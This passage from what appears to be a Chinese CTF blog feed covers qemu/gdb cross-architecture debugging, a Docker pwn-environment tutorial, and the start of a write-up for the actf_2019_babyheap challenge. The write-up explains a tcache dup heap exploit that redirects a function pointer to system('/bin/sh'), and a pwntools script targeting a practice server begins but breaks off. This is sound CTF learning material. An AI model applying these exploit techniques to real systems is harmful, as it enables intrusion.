variable\">-8</span> <span class=\"token function\">vim</span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/%E5%BC%82%E6%9E%B6%E6%9E%84/",
            "url": "http://waltcsz.github.io/2023/11/%E5%BC%82%E6%9E%B6%E6%9E%84/",
            "title": "异架构",
            "date_published": "2023-11-18T09:26:53.000Z",
            "content_html": "<h1 id=\"debug\"><a class=\"markdownIt-Anchor\" href=\"#debug\">#</a> debug</h1>\n<p>可以使用 qemu 的 - g 指定端口</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ qemu-aarch64 <span class=\"token parameter variable\">-g</span> <span class=\"token number\">1234</span> <span class=\"token parameter variable\">-L</span> /usr/aarch64-linux-gnu ./apollo</pre></td></tr></table></figure><p>然后使用 gdb-multiarch 进行调试，先指定架构，然后使用 remote 功能</p>\n<p>在另外一个终端（上一个你也用不了）打开 gdb -multiarch</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ gdb-multiarch ./apollo <span class=\"token parameter variable\">-q</span></pre></td></tr></table></figure><p>然后连接到端口进行远程调试</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gdb-peda$ <span class=\"token builtin class-name\">set</span> architecture aarch64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>The target architecture is assumed to be aarch64</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>gdb-peda$ target remote localhost:1234</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Remote debugging using localhost:1234</pre></td></tr></table></figure><h1 id=\"arm\"><a class=\"markdownIt-Anchor\" href=\"#arm\">#</a> ARM</h1>\n<h1 id=\"risc-v\"><a class=\"markdownIt-Anchor\" href=\"#risc-v\">#</a> RISC-V</h1>\n<table>\n<thead>\n<tr>\n<th>name</th>\n<th>ABI 助记符</th>\n<th>用途</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>x0</td>\n<td>zero</td>\n<td>zero</td>\n</tr>\n<tr>\n<td>x1</td>\n<td>ra</td>\n<td>返回地址</td>\n</tr>\n<tr>\n<td>x2</td>\n<td>sp</td>\n<td>栈指针</td>\n</tr>\n<tr>\n<td>x3</td>\n<td>gp</td>\n<td>全局指针</td>\n</tr>\n<tr>\n<td>x4</td>\n<td>tp</td>\n<td>线程指针</td>\n</tr>\n<tr>\n<td>x5-x7</td>\n<td>t0-t2</td>\n<td>临时寄存器</td>\n</tr>\n<tr>\n<td>x8-x9</td>\n<td>s0-s1</td>\n<td>callee 保存的寄存器</td>\n</tr>\n<tr>\n<td>x10-x17</td>\n<td>a0-a7</td>\n<td>参数寄存器</td>\n</tr>\n<tr>\n<td>x18-27</td>\n<td>s2-s11</td>\n<td>callee 保存的寄存器</td>\n</tr>\n<tr>\n<td>x28-x31</td>\n<td>t3-t6</td>\n<td>临时寄存器</td>\n</tr>\n</tbody>\n</table>\n<p>在参数保存之后，通过 <code>jal</code>  指令跳转到函数开始执行。jal 指令的规范为：</p>\n<pre><code class=\"language-assembly\">jal ra, offset\n</code></pre>\n<p>将会把下一条指令 (pc+4) 地址存放到 ra 寄存器中，然后跳转到当前地址 + offset 位置开始执行。<br>\n在子函数中，将会把 ra 寄存器存放到栈上，在函数返回时从栈上恢复 ra 寄存器，这里也就 <code>存在栈溢出的机会</code> 。</p>\n",
            "tags": [
                "异架构"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/11/docker/",
            "url": "http://waltcsz.github.io/2023/11/docker/",
            "title": "docker",
            "date_published": "2023-11-17T17:40:18.000Z",
            "content_html": "<p>docker 使用</p>\n<h1 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>docker 是一款精简的虚拟机。</p>\n<p><strong>image 镜像</strong>：储存固定的系统镜像。类似模板，类，或者类似 VMware 虚拟机的快照。</p>\n<p><strong>container 容器</strong>：从镜像生成出的实例。类似成品，对象，或者正常情况的 vmware 虚拟机。储存运行时的任何修改。</p>\n<p>一个 image 可以生成出很多 container。container 可以保存为 image，然后供自己或他人后续使用。</p>\n<h1 id=\"包含\"><a class=\"markdownIt-Anchor\" href=\"#包含\">#</a> 包含</h1>\n<p>虚拟机包含的软件。</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dhbGxvcHNsZWQvcHdudG9vbHM=\">pwntools</span> —— CTF framework and exploit development library</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3B3bmRiZy9wd25kYmc=\">pwndbg</span> —— a GDB plug-in that makes debugging with GDB suck less, with a focus on features needed by low-level software developers, hardware hackers, reverse-engineers and exploit developers</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Njd3VhcHR4L1B3bmdkYg==\">pwngdb</span> —— gdb for pwn</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pvbmF0aGFuU2Fsd2FuL1JPUGdhZGdldA==\">ROPgadget</span> —— facilitate ROP exploitation tool</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2luYXoyL3JvcHV0aWxz\">roputils</span> —— A Return-oriented Programming toolkit</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RhdmlkOTQyai9vbmVfZ2FkZ2V0\">one_gadget</span> —— A searching one-gadget of execve(‘/bin/sh’, NULL, NULL) tool for amd64 and i386</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FuZ3IvYW5ncg==\">angr</span> —— A platform-agnostic binary analysis framework</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JhZGFyZS9yYWRhcmUy\">radare2</span> —— A rewrite from scratch of radare in order to provide a set of libraries and tools to work with binary files</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RhdmlkOTQyai9zZWNjb21wLXRvb2xz\">seccomp-tools</span> —— Provide powerful tools for seccomp analysis</li>\n<li>linux_server[64] —— IDA 7.0 debug server for linux</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90bXV4LmdpdGh1Yi5pby8=\">tmux</span> —— a terminal multiplexer</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW51eC5kaWUubmV0L21hbi8xL2x0cmFjZQ==\">ltrace</span> —— trace library function call</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW51eC5kaWUubmV0L21hbi8xL3N0cmFjZQ==\">strace</span> —— trace system call</li>\n</ul>\n<h2 id=\"ubuntu初始化脚本\"><a class=\"markdownIt-Anchor\" href=\"#ubuntu初始化脚本\">#</a> ubuntu 初始化脚本</h2>\n<p>pwndbg 仅负责 ubuntu22.04 版本及以上的可用性。在低版本可能不适用。github 尤其指出了 ubuntu18.04 已停止支持并给出了最后版本的代码。在安装时还需将 setup.sh 内的 <code>git submodule update --init --recursive</code>  注释掉，因为文件夹内不含 <code>.git</code>  文件夹并且不能更新至最新库。</p>\n<p>同时需要<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpYW93ZW54aW9uZy9hcnRpY2xlL2RldGFpbHMvMTE2NDAxNTI0\">设置 locale</span>，使得 LC_CTYPE=en_US.UTF-8.</p>\n<pre><code>#!/bin/sh\ncd /root/\nunminimize\napt install vim\napt install git\napt install python3-pip\n#pip3 install setuptools\npip3 install --upgrade pip setuptools\n\nsudo pip3 install pwntools\n\n# git clone https://github.com/pwndbg/pwndbg.git\nif [ ! -f '2023.07.17.tar.gz' ]; then\n\twget https://github.com/pwndbg/pwndbg/archive/refs/tags/2023.07.17.tar.gz\nfi\ntar -xzvf 2023.07.17.tar.gz\nmv pwndbg* ./toolbox/pwndbg\ncd ./toolbox/pwndbg\n./setup.sh\n\n\n</code></pre>\n<h1 id=\"docker容器\"><a class=\"markdownIt-Anchor\" href=\"#docker容器\">#</a> docker 容器</h1>\n<ul>\n<li>ubuntu18.04\tskysider/pwndocker</li>\n</ul>\n<pre><code>docker pull skysider/pwndocker\n</code></pre>\n<ul>\n<li>pwndocker</li>\n</ul>\n<h2 id=\"included-glibc\"><a class=\"markdownIt-Anchor\" href=\"#included-glibc\">#</a> included glibc</h2>\n<p>Default compiled glibc path is  <code>/glibc</code> .</p>\n<ul>\n<li>2.19 —— ubuntu 12.04 default libc version</li>\n<li>2.23 —— ubuntu 16.04 default libc version</li>\n<li>2.24 —— introduce vtable check in file struct</li>\n<li>2.27 —— pwndocker default glibc version</li>\n<li>2.28~2.31 —— latest libc versions</li>\n</ul>\n<h1 id=\"使用\"><a class=\"markdownIt-Anchor\" href=\"#使用\">#</a> 使用</h1>\n<p>建议用官方的使用姿势，用如下命令 run 起来</p>\n<pre><code>docker run -d \\\n\t--rm \\\n\t-h $&#123;ctf_name&#125; \\\n\t--name $&#123;ctf_name&#125; \\\n\t-v $(pwd)/$&#123;ctf_name&#125;:/ctf/work \\\n\t-p 23946:23946 \\\n\t--cap-add=SYS_PTRACE \\\n\tskysider/pwndocker\n</code></pre>\n<p>其中有两个重要的参数<br>\n - v <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>p</mi><mi>w</mi><mi>d</mi><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">/</mi></mrow><annotation encoding=\"application/x-tex\">(pwd)/</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">pw</span><span class=\"mord mathnormal\">d</span><span class=\"mclose\">)</span><span class=\"mord\">/</span></span></span></span>{ctf_name}:/ctf/work 是将当前目录下的文件映射到 docker /ctf/work 目录下<br>\n这样你在物理机修改文件，docker 里面也会发生变化，就不用再 docker cp 了</p>\n<p>–cap-add=SYS_PTRACE 这个参数也是要一定加的，不然 docker 里面没法用 gdb 调试。</p>\n<p>可以把上述命令放到 pwndocker_run.sh 里面 方便下次使用</p>\n<h2 id=\"多终端调试\"><a class=\"markdownIt-Anchor\" href=\"#多终端调试\">#</a> ？多终端调试</h2>\n<p>然后调试脚本时，要先进去 tmux ，python 脚本里面指定终端为 tmux</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sp'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>就可以 gdb.attach (p) 了 如下图</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-itd</span> <span class=\"token parameter variable\">--name</span> u18 ubuntu:18.04 /bin/bash</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">cp</span> <span class=\"token parameter variable\">-L</span> u18:/lib/x86_64-linux-gnu/libselinux.so.1 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">cp</span> <span class=\"token parameter variable\">-L</span> u18:/lib/x86_64-linux-gnu/libpcre2-8.so.0 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">cp</span> libselinux.so.1 pwn:/glibc/2.28/64/lib/</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">cp</span> libpcre2-8.so.0 pwn:/glibc/2.28/64/lib/</pre></td></tr></table></figure><h2 id=\"docker-进程\"><a class=\"markdownIt-Anchor\" href=\"#docker-进程\">#</a> docker 进程</h2>\n<p>docker 进程启动、停止、重启，常见的三种 case</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">service</span> <span class=\"token function\">docker</span> start\t<span class=\"token comment\"># 启动 docker</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">service</span> <span class=\"token function\">docker</span> stop\t\t<span class=\"token comment\"># 关机 docker</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">service</span> <span class=\"token function\">docker</span> restart\t<span class=\"token comment\"># 重启 docker</span></pre></td></tr></table></figure><h2 id=\"镜像操作\"><a class=\"markdownIt-Anchor\" href=\"#镜像操作\">#</a> 镜像操作</h2>\n<p>镜像作为容器执行的前提条件，一般需要掌握的几个命令无非是搜索，下载，删除，创建</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> images\t\t<span class=\"token comment\"># 镜像列表</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">docker</span> search xxx\t<span class=\"token comment\"># 检索镜像，从镜像仓库中检索</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">docker</span> pull xxx\t\t<span class=\"token comment\"># 下载镜像</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">docker</span> rmi xxx\t\t<span class=\"token comment\"># 删除镜像</span></pre></td></tr></table></figure><p>关于创建镜像，有必要稍微详细一点点</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> commit <span class=\"token parameter variable\">-m</span><span class=\"token operator\">=</span><span class=\"token string\">\"首次提交\"</span> <span class=\"token parameter variable\">-a</span><span class=\"token operator\">=</span><span class=\"token string\">\"一灰灰Blog\"</span> dd85eb055fe8 yh/centos:v0.1\t<span class=\"token comment\"># 通过容器创建镜像</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">history</span> yh/centos\t<span class=\"token comment\"># 镜像历史查询</span></pre></td></tr></table></figure><p>上面的几个参数进行说明</p>\n<ul>\n<li><code>-m</code>  和 git 的提交一样，后面更上描述信息</li>\n<li><code>-a</code>  版权声明，这个东西是我创建的，有啥问题，找我</li>\n<li><code>dd85eb055fe8</code>  容器 id</li>\n<li><code>yhh/quick-os:0.1</code>  创建的镜像名</li>\n</ul>\n<h2 id=\"容器操作\"><a class=\"markdownIt-Anchor\" href=\"#容器操作\">#</a> 容器操作</h2>\n<p>接下来就是正菜了，容器的各种操作，启动，关闭，重启，日志查询以及各种进入容器内部搞事情</p>\n<h2 id=\"创建\"><a class=\"markdownIt-Anchor\" href=\"#创建\">#</a> 创建</h2>\n<p>万事开头第一步，加载镜像，创建容器</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> run 镜像名:版本 程序指令</pre></td></tr></table></figure><p>run 后面可以跟很多的参数，比如容器暴露端口指定，存储映射，权限等等，由于参数过多，下面只给出几个不同的例子，来具体的演示参数可以怎么加 +</p>\n<h3 id=\"常用参数\"><a class=\"markdownIt-Anchor\" href=\"#常用参数\">#</a> 常用参数</h3>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>示例</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-i</td>\n<td></td>\n<td>打开 STDIN，支持交互</td>\n</tr>\n<tr>\n<td>-t</td>\n<td></td>\n<td>支持终端登陆</td>\n</tr>\n<tr>\n<td>-v</td>\n<td></td>\n<td>设置共享文件夹。宿主目录：容器目录</td>\n</tr>\n<tr>\n<td>-d</td>\n<td></td>\n<td>设为后台运行</td>\n</tr>\n<tr>\n<td>–name</td>\n<td>–nam=u18</td>\n<td>指定容器名称</td>\n</tr>\n<tr>\n<td>-p</td>\n<td>-p 8080:80</td>\n<td>暴露端口。宿主端口：容器端口</td>\n</tr>\n<tr>\n<td>–restart</td>\n<td>–restart=always</td>\n<td>程序终止后是否重启</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"示例\"><a class=\"markdownIt-Anchor\" href=\"#示例\">#</a> 示例</h3>\n<p>创建交互型容器</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-it</span> centos:latest /bin/bash</pre></td></tr></table></figure><p>创建容器后运行在后台</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-i</span> <span class=\"token parameter variable\">-t</span> <span class=\"token parameter variable\">-d</span> centos:latest</pre></td></tr></table></figure><p>创建容器，运行后台，结束后自动重启，设置名称、端口、共享目录。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-d</span> <span class=\"token parameter variable\">--restart</span><span class=\"token operator\">=</span>always <span class=\"token parameter variable\">--name</span><span class=\"token operator\">=</span>yhh_centos <span class=\"token parameter variable\">-p</span> <span class=\"token number\">8080</span>:80 <span class=\"token parameter variable\">-v</span> /home/yihui/html/www:/var/www centos:latest</pre></td></tr></table></figure><h2 id=\"基础操作\"><a class=\"markdownIt-Anchor\" href=\"#基础操作\">#</a> 基础操作</h2>\n<p>容器创建完毕之后，就是一些基本操作了，启动、停止、重启、删除</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">ps</span> <span class=\"token parameter variable\">-a</span>\t\t<span class=\"token comment\"># 查看容器列表， 列出所有的容器</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">docker</span> start xxx\t<span class=\"token comment\"># 启动容器，start 后面可以跟上容器名，或者容器 id</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># (这里的 xxx 可以是容器名：yhh_centos 也可以是容器 id：f57398ab22c5)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">docker</span> stop xxx\t\t<span class=\"token comment\"># 关闭容器</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">docker</span> restart xxx\t<span class=\"token comment\"># 重启</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">rm</span> xxx\t\t<span class=\"token comment\"># 删除</span></pre></td></tr></table></figure><p>在查看容器列表时，如果某个容器的启动参数特别长，直接使用 <code>docker ps -a</code>  会发现看不到完整的启动命令，这个时候可以带上参数 <code>--no-trunc</code>  来显示完整命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">ps</span> <span class=\"token parameter variable\">-a</span> --no-trunc</pre></td></tr></table></figure><h2 id=\"高级操作\"><a class=\"markdownIt-Anchor\" href=\"#高级操作\">#</a> 高级操作</h2>\n<p>接下来进入一些容器的高级操作技巧（实际上也并没有特别酷炫）</p>\n<p>为了演示一些进阶的内容，这里创建一个容器作为测试</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-it</span> <span class=\"token parameter variable\">-d</span> <span class=\"token parameter variable\">--name</span><span class=\"token operator\">=</span>yhhos centos</pre></td></tr></table></figure><h3 id=\"容器日志查询\"><a class=\"markdownIt-Anchor\" href=\"#容器日志查询\">#</a> 容器日志查询</h3>\n<p>日志，定位问题的神器</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> logs yhhos\t<span class=\"token comment\"># 查询 xxx 容器的日志</span></pre></td></tr></table></figure><p>基本上不太会直接使用上面的命令，因为上面把所有的日志都打印出来了，可以直接晃瞎我们的钛合金 x 眼</p>\n<p>一般日志可以加两个参数  <code>-f</code> ,  <code>-t</code></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> logs <span class=\"token parameter variable\">-f</span> <span class=\"token parameter variable\">-t</span> <span class=\"token parameter variable\">--since</span><span class=\"token operator\">=</span><span class=\"token string\">\"2019-05-11\"</span> <span class=\"token parameter variable\">--tail</span><span class=\"token operator\">=</span><span class=\"token number\">10</span> yhhos</pre></td></tr></table></figure><ul>\n<li><code>--since</code>  : 此参数指定了输出日志开始日期，即只输出指定日期之后的日志。</li>\n<li><code>-f</code>  : 查看实时日志</li>\n<li><code>-t</code>  : 查看日志产生的日期</li>\n<li><code>--tail=10</code>  : 查看最后的 10 条日志。</li>\n</ul>\n<h3 id=\"文件拷贝\"><a class=\"markdownIt-Anchor\" href=\"#文件拷贝\">#</a> 文件拷贝</h3>\n<p>将容器的某个文件捞出来；或者强塞，一个 cp 即可</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 将当前目录的 test.md 文件拷贝到容器的 /tmp 目录下</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">cp</span> test.md yhhos:/tmp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 将容器的 /tmp/test.md 目录拷贝到当前目录下</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">cp</span> yhhos:/tmp/test.md ./out.md</pre></td></tr></table></figure><h3 id=\"进入容器\"><a class=\"markdownIt-Anchor\" href=\"#进入容器\">#</a> 进入容器</h3>\n<p>进入容器内部，然后就可以为所欲为了…</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token builtin class-name\">exec</span> <span class=\"token parameter variable\">-it</span> yhhos /bin/bash</pre></td></tr></table></figure><h3 id=\"获取容器所有信息\"><a class=\"markdownIt-Anchor\" href=\"#获取容器所有信息\">#</a> 获取容器所有信息</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> inspect yhhos</pre></td></tr></table></figure><h3 id=\"环境变量设置\"><a class=\"markdownIt-Anchor\" href=\"#环境变量设置\">#</a> 环境变量设置</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ExMjM0NTY3NmFiYy9hcnRpY2xlL2RldGFpbHMvODQ2NTE0Nzc=\">docker 环境变量设置_dockerfile env path-CSDN 博客</span></p>\n<h1 id=\"tmux\"><a class=\"markdownIt-Anchor\" href=\"#tmux\">#</a> tmux</h1>\n<p>用于在 docker 同时运行多个终端。尤其是在使用 <code>gdb.attach()</code>  时十分有用。</p>\n",
            "tags": [
                "docker"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/11/buu-1117/",
            "url": "http://waltcsz.github.io/2023/11/buu-1117/",
            "title": "buu_1117",
            "date_published": "2023-11-17T12:40:02.000Z",
            "content_html": "<h1 id=\"actf_2019_babyheap\"><a class=\"markdownIt-Anchor\" href=\"#actf_2019_babyheap\">#</a> actf_2019_babyheap</h1>\n<p>tcache dup</p>\n<p>libc-2.27_0ubuntu1_amd64</p>\n<p>这道题除了地址随机，其他保护都开了。有 tcache dup 漏洞。</p>\n<p>经典的使用块去管理用户块。管理块先存放用户块地址，然后存放输出函数地址。</p>\n<p>释放块后形成块链，由于 tcache 只会清空 8 字节存放 fd，所以输出函数地址不会被清除。利用这点输出 tcache bin 链上某个块的地址，实现堆地址泄露。</p>\n<p>构造 管理块 -&gt; 管理块，在后者中输入块地址和 system 函数地址。输入的地址对应的块为存放 <code>&quot;/bin/sh\\0&quot;</code>  字符串的块。</p>\n<blockquote>\n<p>每次输出菜单后都会调用 system，产生内核用户互换，导致调试中断。所以只能该调式的地方都加行 <code>gdb.attach()</code> 。</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'ACTF_2019_babyheap'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27387</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x400D69'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token 